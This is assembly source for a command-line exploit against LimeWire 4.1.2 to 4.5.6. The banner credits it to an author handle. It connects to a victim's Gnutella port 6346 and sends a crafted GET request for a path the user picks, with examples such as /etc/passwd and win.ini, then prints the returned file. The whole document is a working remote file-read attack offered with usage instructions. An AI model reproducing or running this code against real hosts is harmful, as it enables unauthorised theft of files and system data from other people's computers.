.386
.model flat, stdcall
option casemap: none

include \masm32\include\windows.inc 
include \masm32\include\user32.inc 
include \masm32\include\kernel32.inc 
include \masm32\include\shell32.inc
include \masm32\include\wsock32.inc
include \masm32\include\masm32.inc
includelib \masm32\lib\shell32.lib
includelib \masm32\lib\user32.lib 
includelib \masm32\lib\kernel32.lib 
includelib \masm32\lib\wsock32.lib
includelib \masm32\lib\masm32.lib


.data
usage       db "          Limewire 4.1.2 - 4.5.6 remote exploit",13,10,\
               "                      by: illwill ",13,10,\
               "                   xillwillx@yahoo.com ",13,10,13,10,\
               "Usage: lw.exe <ip> <file>",13,10,\
               "Example1 (nix): lw 10.0.0.2 /etc/passwd",13,10,\
               "Example2 (win): lw 10.0.0.2 C:\Windows\win.ini",13,10,0
 GetTemplate db "GET /gnutella/res/%s HTTP/1.0",0dh,0ah
             db "User-Agent: I-AM-AN-ATTACKER",0Dh,0Ah
             db "Host: 0.0.0.0:0",0Dh,0Ah
             db "Connection: Keep-Alive",0Dh,0Ah
             db "Accept: */*",0Dh,0Ah,0dh,0ah,0
  szHost      db "Cannot connect to %s.",0  
 	RcvError   db	"Socket Error When Receiving Data.",0Dh,0Ah,0         
.data?
 IPAddress   db 32 dup(?)
 szFile      db 128 dup(?)
 Getbuffer   db 512 dup(?)
 buffer      db 64 dup(?)   
 sock        dd ?
 sin         sockaddr_in <?>
 wsadata     WSADATA <?> 
 buff_sock   db 128 dup (?)
.code
start:            
         invoke GetCL, 1, addr IPAddress 
         invoke lstrlen,addr IPAddress
           .IF eax>500
             invoke ExitProcess,1
           .ELSEIF eax==0
            invoke StdOut,addr usage
           invoke ExitProcess,0
          .ENDIF
      
         invoke GetCL, 2, addr szFile
 invoke WSAStartup, 101h, offset wsadata
    cmp eax, 0
    jne start
 invoke socket,AF_INET,SOCK_STREAM,0          
      mov sock,eax
      mov sin.sin_family, AF_INET
      invoke htons, 6346           
      mov sin.sin_port,ax          
      invoke inet_addr, addr IPAddress 
      mov sin.sin_addr,eax
      invoke connect,sock,addr sin,sizeof sin
          .if eax==SOCKET_ERROR  
               invoke wsprintf,addr buffer,addr szHost,addr IPAddress
               invoke	StdOut,addr buffer
               jmp Err
           .else
                invoke wsprintf,addr Getbuffer,addr GetTemplate,addr szFile
                invoke lstrlen,addr Getbuffer
                invoke send,sock,addr Getbuffer,eax,0  
                invoke	StdOut, addr Getbuffer
              _recvLoop:
                invoke  recv, [sock], addr buff_sock, sizeof buff_sock, 0
		               test	eax, eax
		            mov		ecx, offset RcvError
		              jz		Err
		              cmp		eax, SOCKET_ERROR
		             je		_error
		       		mov		[buff_sock][eax], 0
		          invoke	StdOut, addr buff_sock
	              jmp		_recvLoop
          .endif

Err:
   invoke WSACleanup 
   invoke ExitProcess,0

_error:
	invoke	StdOut, ecx
  xor		ebx, ebx
  jmp Err  
end start
